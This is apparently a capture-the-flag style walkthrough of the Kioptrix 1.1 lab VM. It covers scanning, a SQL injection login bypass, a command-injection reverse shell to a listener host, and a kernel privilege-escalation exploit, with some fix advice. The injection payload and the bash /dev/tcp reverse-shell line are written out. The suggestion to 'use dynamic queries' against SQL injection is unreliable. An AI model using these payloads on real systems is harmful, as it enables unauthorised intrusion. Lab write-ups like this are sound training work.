# **Vulnerable System** : Kioptrix 1.1

**Operating System** : CentOS 4.5

**Kernel** : 2.6.9

**Vulnerability Exploited** : SQL Injection

**Exploit Used** : N/A

**Proof of Concept Code** : Admin&#39; #

**Vulnerability Explained** :  The Remote System Administration Login was vulnerable to SQL injection, which granted access to Remote System Administration Web Console.

**Vulnerability fix** : When making a login page that connects to MySQL database, either use dynamic queries or make sure that user&#39;s input is validated.

**Severity: Low**

----------------------------------------------------------------------------------------------------------------------------------------

**Vulnerability Exploited** : Command Execution

**Exploit Used** : N/A

**Proof of Concept Code** : 192.168.20.144 &amp;&amp; bash -i \&gt;&amp; /dev/tcp/192.168.20.144/443 0\&gt;&amp;1

**Vulnerability Explained** :  The Remote System Administration Web Console page was vulnerable to command execution, which resulted in gaining low privilege shell.

**Vulnerability fix** : User input should be validated and only IP address should be allowed to be entered.

**Severity** : **Medium**

----------------------------------------------------------------------------------------------------------------------------------------

**Privilege Escalation Vulnerability** : Linux Kernel &#39;sock\_sendpage()&#39; NULL Pointer Dereference

**Exploit Used** : Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - &#39;sock\_sendpage()&#39; Local Privilege Escalation

**Proof of Concept Code** : [https://www.exploit-db.com/exploits/9545](https://www.exploit-db.com/exploits/9545)

**Privilege Escalation Vulnerability Explained:** Linux kernel vulnerability allows to gain administrative privileges with specifically crafted executable.

**Vulnerability fix** : Update Linux kernel to the newest version possible. Patches available from the vendor, for more information [https://access.redhat.com/security/cve/cve-2009-2692](https://access.redhat.com/security/cve/cve-2009-2692).

**Severity** : **High**

----------------------------------------------------------------------------------------------------------------------------------------

## Methodology

    * Host Discovery (arpscan)

    * Port Scanning (nmap)

    * Web Port Enumeration (nikto, gobuster, browser)

    * Discovered MySQL Injection Vulnerability (browser)

    * Discovered Command Execution Vulnerability (browser)

    * Low Privilege Shell Gained

    * Privilege Escalation Enumeration (uname, cat /etc/\*-release)

    * Discovered Appropriate Exploit &#39;sock\_sendpage()&#39; Local Privilege Escalation (searchsploit/exploit-db)

    * Compiled the Exploit and Gained Administrative Privileges

----------------------------------------------------------------------------------------------------------------------------------------

## Arp-scan

Discovering the vulnerable system with arp-scan -l:

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/arp-scan.png)

## Nmap

Nmap all ports scan:

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/nmap_allportsd.png)

\*Note: Nmap -p- flag scans all TCP ports from 1 to 65535.

Nmap version, default script and aggressive scan:

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/nmap_sv.png)
 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/nmap_sv1.png)

-p specifies the ports to scan

-sV flag attempts to determine service and version information for given ports

-sC flag utilizes a default set of nmap scripts



## Port 80 Enumeration

### Nikto

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/nikto.png)

### Gobuster

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/gobuster.png)

  *Note: Gobuster discovers hidden web directories. New versions of gobuster come with 3 different modes: dns, dir and vhost. In this case dir is used. -u flag is used to specify the url and -w flag is used to specify the wordlist to be used.

### Browser

The browser presents us with a login page:

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/browser.png)

## Exploitation

### Low Privilege Exploitation

#### SQL Injection

The login page is vulnerable to SQL injection:

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/sql_injection.png)

#### Command Execution

Once logged it, there seems to be a ping command running from the web interface:

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/command%20execution.png)

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/command%20execution1.png)

With the correct syntax it&#39;s possible to append another command to the ping command to execute the reverse shell as shown below:

192.168.20.144 &amp;&amp; bash -i \&gt;&amp; /dev/tcp/192.168.20.144/443 0\&gt;&amp;1

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/command%20execution3.png)

### Privilege Escalation

Obtaining low privilege shell and determining the system&#39;s operating system and kernel:

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/low%20privilege.png)

python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; command upgrades the &quot;dumb&quot; web shell to fully interactive tty shell. With out this, commands such as su – will not work.

The operating system is CentOS release 4.5 and the kernel version is 2.6.9



#### Searchsploit:

Searching exploit-db for suitable exploit:

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/searchsploit.png)

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/searchsploit2.png)

#### Privilege Escalation Exploit

Downloading the exploit to the victim machine.

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/downloading.png)

Compiling the exploit, executing the exploit and gaining root privileges:

 ![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%202/Images/compiling.png)
